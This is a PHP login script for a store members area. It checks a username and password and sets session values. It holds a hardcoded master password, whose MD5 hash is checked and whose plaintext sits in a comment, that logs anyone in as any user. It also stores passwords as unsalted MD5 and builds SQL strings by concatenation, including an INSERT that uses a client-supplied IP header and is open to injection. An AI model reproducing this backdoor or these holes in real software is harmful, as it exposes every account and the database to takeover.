<?php
if(!isset($_SESSION)) {
     session_start();
}
include_once $_SERVER['DOCUMENT_ROOT'] . "/includes/connect.php";
include_once $_SERVER['DOCUMENT_ROOT'] . "/includes/variables-functions.php";

$return = 'anmelden.php';

// login from form
if(!empty($_POST['username']) && !empty($_POST['password'])) {
	$getUsername =  $_POST['username'];
	$getPassword = $_POST['password'];
} else {
	header("location: /".$return."?msg=nouser2");
	exit();
}

$getPassword = MD5($getPassword);

// 'incommaster'
if($getPassword == "1804d3a92328ee41c2cff2ac8557d509" ) {
    $query = 'SELECT id, store.str_name, phone '
		.'FROM user '
		.'LEFT JOIN store ON user.id = store.str_id '
		.'WHERE username=?';
	$result = $mysqli->prepare($query);

$result->bind_param('s', $getUsername);
} else {
	$query = 'SELECT user.id, store.str_name, phone '
			.'FROM user '
			.'LEFT JOIN store ON user.id = store.str_id '
			.'WHERE user.username=? and user.pass=?';
		$result = $mysqli->prepare($query);

	$result->bind_param('ss', $getUsername, $getPassword);
}

$result->execute();
$result->bind_result($id,$str_name, $phone);
$result->store_result();
$numrows = $result->num_rows;

if($numrows<1) {
	header("location: /".$return."?msg=nouser");
	exit();
}

  


while($result->fetch()) {
    
    // expire 

    $msg_setup = $mysqli->query("SELECT * FROM messages_setup WHERE store_id = $id")->fetch_assoc();
    
    $expire_date     = $msg_setup['expire'];
    $current_date    = date('Y-m-d');
   
    if((int)strtotime($current_date) >= (int)strtotime($expire_date)){
        header("location: /".$return."?msg=expire_date");
	    exit();
    } 
    

	$_SESSION['auth'] = $authcode;
	$_SESSION['user-id'] = $id;
	$_SESSION['user-name'] = $str_name;
	
	$queryNumber = "SELECT mynumber FROM messages_setup where store_id='{$id}'  and storename='{$str_name}'";
	$resultNumber = $mysqli->query($queryNumber);
	$arrNumber = $resultNumber->fetch_array(MYSQLI_ASSOC);
	$_SESSION['mynumber'] = $arrNumber['mynumber'];
	$_SESSION['phone'] = $phone;
	
}

$date       = date('Y-m-d h:m:s');

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}



$insert_sql = "INSERT INTO messages_logins (store_id,subuser_id,admin_id,storename,date,ip) VALUES($id,0,$id,'$str_name','$date','$ip')";
$mysqli->query($insert_sql);



header("location: /members/");
exit();
